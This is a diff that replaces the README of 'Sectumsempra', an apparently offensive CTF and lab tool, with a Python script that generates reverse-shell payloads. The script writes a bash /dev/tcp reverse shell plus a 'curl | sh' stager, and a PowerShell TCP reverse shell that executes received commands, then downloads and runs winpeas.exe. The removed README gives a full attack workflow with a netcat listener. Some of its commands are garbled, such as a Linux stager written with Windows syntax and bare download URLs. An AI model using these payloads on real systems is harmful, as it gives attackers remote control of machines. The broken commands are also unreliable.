@@ -1,83 +1,75 @@
-# Sectumsempra v1.0
+#!/usr/bin/env python3
+import sys
+import socket
+import os
 
-**Sectumsempra** is an automated attack execution and post exploitation framework engineered for CTFs, labs, and authorized assessments, designed to immediately weaponize the findings provided by the NetWeave reconnaissance engine.
+def get_attack_ip():
+    # Attempting retrieval of TryHackMe VPN interface IP address
+    try:
+        import netifaces
+        if 'tun0' in netifaces.interfaces():
+            addrs = netifaces.ifaddresses('tun0')
+            return addrs[netifaces.AF_INET][0]['addr']
+    except ImportError:
+        pass
+    
+    # Fallback routine: Extracting IP from local routing socket tuple interface
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        # s.getsockname() returns a tuple (IP, Port). Extracting index [0] to ensure correct string formatting.
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception:
+        return "127.0.0.1"
 
-```text
-TARGET ──► ATTACK PATH ──► FOOTHOLD PAYLOAD ──► REVERSE SHELL ──► PRIVILEGE ESCALATION
-```
+def generate_payloads(attack_ip, lport):
+    print(f"[*] Utilizing Local Network Binding Address: {attack_ip}")
+    print(f"[*] Utilizing Specified Listening Port: {lport}")
+    
+    # Define system deployment paths
+    linux_script_path = "deploy_linux.sh"
+    windows_script_path = "deploy_windows.ps1"
+    
+    # 1. Linux Payload Generation Block
+    linux_payload = (
+        "#!/bin/bash\n"
+        f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1 &\n"
+        "curl -sL https://github.com | sh\n"
+    )
+    
+    with open(linux_script_path, "w") as f:
+        f.write(linux_payload)
+    os.chmod(linux_script_path, 0o755)
+    print("[+] Linux Deployment Script Ready")
+    
+    # 2. Windows Payload Generation Block
+    windows_payload = (
+        f"$client = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});"
+        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
+        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
+        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
+        "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
+        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n"
+        "iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe\n"
+    )
+    
+    with open(windows_script_path, "w") as f:
+        f.write(windows_payload)
+    print("[+] Windows PowerShell Automation Script Ready")
+    
+    print("[+] Sectumsempra: Payload Generation Complete")
 
-## Deployment
+def main():
+    if len(sys.argv) < 2:
+        print("[-] Usage error. Correct format: python3 sectumsempra.py <LPORT>")
+        sys.exit(1)
+        
+    lport = sys.argv[1]
+    attack_ip = get_attack_ip()
+    generate_payloads(attack_ip, lport)
 
-### 1. Clone & Setup
-```bash
-git clone https://github.com/danielissaq/Sectumsempra.git
-cd Sectumsempra
-```
-
-### 2. Set up Python
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-python -m pip install --upgrade pip
-python -m pip install netifaces
-```
-
-### 3. Verify Attack Interface
-Sectumsempra tracks local network topology to bind your listening interface. It will automatically prioritize your active TryHackMe VPN tunnel (`tun0`), but will seamlessly fall back to your local LAN/WLAN interface IP layout if no tunnel is detected:
-```bash
-ip a show tun0
-```
-
-## Complete Attack Workflow
-
-### 1. Recon Sequence (Primary Terminal Tab)
-Launch your reconnaissance infrastructure against the target machine using NetWeave:
-```bash
-python pwn_recon.py
-```
-Isolate the optimal entry point provided under the generated `GOLDEN PATH` analysis output block.
-
-### 2. Payload Sequence (Second Terminal Tab)
-Open a new terminal tab, navigate into your local repository workspace, and compile your custom staging shell sequences:
-```bash
-cd ~/Sectumsempra
-source .venv/bin/activate
-python3 sectumsempra.py
-```
-Input the targeted remote host IP address and assign your incoming listener port when prompted.
-
-### 3. Listener Sequence (Third Terminal Tab)
-Before executing any attack payloads on the target system, open a separate terminal tab and open your incoming port handler to receive the reverse connection loop:
-```bash
-nc -lvnp 4444
-```
-
-### 4. Post Exploitation Sequence (Active Shell Tab)
-Execute the payload script compiled by Sectumsempra against the target vulnerability vector discovered during the NetWeave phase. Once the active connection drops back into your waiting Netcat listener tab, copy and execute the embedded automated privilege escalation engine:
-
-**For Linux Targets (LinPEAS Live Memory Stager):**
-```bash
-curl -sL https://github.com -OutFile winpeas.exe; .\winpeas.exe | sh
-```
-
-**For Windows Targets (WinPEAS Live PowerShell Memory Stager):**
-```powershell
-iwr https://github.com -OutFile winpeas.exe; .\winpeas.exe
-```
-
-## Generated Payload
-Sectumsempra immediately processes your parameter inputs to output standalone multi-platform execution arrays inside your working path:
-```text
-sectum_linux_strike_<target>.sh
-sectum_win_strike_<target>.ps1
-```
-
-## Requirements
-```text
-Python 3.10+
-netifaces library
-Netcat listener backend
-```
-
-## Legal Notice
-For authorized assessments and labs only against systems you have explicit permission to test.
+if __name__ == "__main__":
+    main()
